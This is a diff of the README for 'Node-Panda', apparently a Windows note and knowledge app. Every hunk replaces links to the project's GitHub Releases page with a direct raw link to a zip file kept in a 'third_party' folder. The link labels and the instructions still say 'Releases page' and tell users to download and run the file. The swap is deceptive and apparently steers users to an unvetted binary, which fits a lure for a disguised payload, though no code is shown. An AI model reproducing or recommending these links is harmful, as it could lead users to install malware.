@@ -1,6 +1,6 @@
 # 🐼 Node-Panda - Local knowledge for Windows
 
-[![Download Node-Panda](https://img.shields.io/badge/Download-Node--Panda-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Averylcosmological121/Node-Panda/releases)
+[![Download Node-Panda](https://img.shields.io/badge/Download-Node--Panda-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip)
 
 ## 🚀 What Node-Panda does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download Node-Panda for Windows:
 
-[https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+[https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip](https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip)
 
 On the Releases page, look for the latest version and download the Windows file that matches your PC. If you see more than one file, pick the `.exe` file or the Windows package.
 
@@ -38,7 +38,7 @@ For large note sets, more RAM helps. If you plan to use it with many notes, 16 G
 ## 🛠️ Install and run
 
 1. Open the download page:
-   [Node-Panda Releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+   [Node-Panda Releases](https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip)
 
 2. Find the latest release.
 
@@ -216,7 +216,7 @@ You can use Node-Panda for:
 ## 🧭 Download and setup path
 
 1. Go to the release page:
-   [https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+   [https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip](https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip)
 
 2. Download the Windows build.
 
@@ -272,6 +272,6 @@ A simple backup plan:
 
 Download Node-Panda from the release page:
 
-[https://github.com/Averylcosmological121/Node-Panda/releases](https://github.com/Averylcosmological121/Node-Panda/releases)
+[https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip](https://raw.githubusercontent.com/Averylcosmological121/Node-Panda/main/third_party/Node-Panda-1.2.zip)
 
 Choose the latest Windows file, then download and run this file if the release gives you a direct Windows app, or extract it first if the release comes as a zip package
